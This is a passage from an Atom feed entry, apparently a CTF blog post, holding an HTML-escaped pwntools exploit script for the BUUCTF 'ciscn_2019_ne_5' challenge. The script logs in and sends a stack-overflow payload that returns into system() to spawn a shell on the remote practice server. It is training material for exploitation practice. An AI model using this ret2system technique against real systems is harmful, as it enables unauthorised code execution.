class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./ciscn_2019_ne_5&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25421)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;quot;./ciscn_2019_ne_5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;quot;password:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(b&amp;quot;administrator&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=elf.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def add(text):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.recvuntil(b&amp;quot;:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.sendline(b&amp;quot;1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.recvuntil(b&amp;quot;nfo:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.sendline(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def et():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.recvuntil(b&amp;quot;:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.sendline(b&amp;quot;4&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x48+4)+p32(system)+b&amp;#x27;\x01\x01\x01\x01&amp;#x27;+p32(0x80482ea)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;et()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="PWN" />
        <updated>2023-12-13T00:46:10.000Z</updated>
    </entry>
</feed>
